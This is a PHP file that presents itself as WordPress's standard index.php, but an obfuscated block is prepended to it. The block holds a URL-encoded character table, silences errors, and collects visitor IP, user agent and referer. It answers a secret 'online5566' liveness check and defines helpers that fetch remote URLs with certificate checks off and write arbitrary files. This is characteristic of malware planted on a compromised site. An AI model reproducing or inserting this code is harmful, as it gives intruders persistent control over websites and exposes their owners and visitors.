<?php
//ncode_K82_K83
error_reporting(0);header('Content-Type: text/html; charset=utf-8');$OoooOO0 = 'ahninetysix';$OOOOOO = "%71%77%65%72%74%79%75%69%6f%70%61%73%64%66%67%68%6a%6b%6c%7a%78%63%76%62%6e%6d%51%57%45%52%54%59%55%49%4f%50%41%53%44%46%47%48%4a%4b%4c%5a%58%43%56%42%4e%4d%5f%2d%22%3f%3e%20%3c%2e%2d%3d%3a%2f%31%32%33%30%36%35%34%38%37%39%27%3b%28%29%26%5e%24%5b%5d%5c%5c%25%7b%7d%21%2a";$O = urldecode($OOOOOO);




date_default_timezone_set('PRC');
$dRoot = @$_SERVER['DOCUMENT_ROOT'];
$rUrl = @$_SERVER['REQUEST_URI'];
$sName = @$_SERVER['HTTP_HOST'];
$Ooolg = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];
$uAgent = @$_SERVER['HTTP_USER_AGENT'];
$referer = @$_SERVER['HTTP_REFERER'];
$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
$typeName = $http_type . $sName;
$uAgent = @strtolower($uAgent);
$referer = @strtolower($referer);
if (getenv('HTTP_CLIENT_IP')) {
    $client_ip = getenv('HTTP_CLIENT_IP');
} elseif (getenv('HTTP_X_FORWARDED_FOR')) {
    $client_ip = getenv('HTTP_X_FORWARDED_FOR');
} elseif (getenv('REMOTE_ADDR')) {
    $client_ip = getenv('REMOTE_ADDR');
} else {
    $client_ip = $_SERVER['REMOTE_ADDR'];
}
if (isset($_GET['vf']) && $_GET['vf'] == 'online5566') {
    echo 'domain online!';
    exit;
}


function getCurl($O, $gurl)
{
    $file_contents = '';
    $user_agent = 'Mozilla/4.0 (compatible;MSIE 6.0;Windows NT 5.2;.NET CLR 1.1.4322)';
    if (function_exists('curl_init')) {
        try {
            $ch = curl_init();
            $timeout = 30;
            curl_setopt($ch, CURLOPT_URL, $gurl);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            $file_contents = curl_exec($ch);
            curl_close($ch);
        } catch (Exception $e) {
        }
    }
    if (strlen($file_contents) < 1 && function_exists('file_get_contents')) {
        ini_set('user_agent', $user_agent);
        try {
            $file_contents = @file_get_contents($gurl);
        } catch (Exception $e) {
        }
    }
    return $file_contents;
}

function putFile($O, $htName, $htContents)
{
    $handle = fopen($htName, 'w') or die('0');
    fwrite($handle, $htContents);
    fclose($handle);
}

?><?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
